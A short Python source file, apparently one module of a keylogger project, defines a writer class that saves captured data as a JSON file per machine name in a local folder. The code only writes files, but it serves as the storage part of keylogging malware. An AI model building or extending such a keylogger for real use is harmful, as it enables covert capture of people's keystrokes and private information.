import json
import os
from Ikeylogger import IWriter

# --הגדרת מיקום שמירת הקובץ--
os.chdir(os.getcwd() + "\\data")


class FileWrite(IWriter):


    def send_data(self, data, machine_name):
        machine_name = machine_name.replace(":", "_")
        with open(f"{machine_name}.json", "w") as file:
            json.dump(data, file)

file_writer = FileWrite()
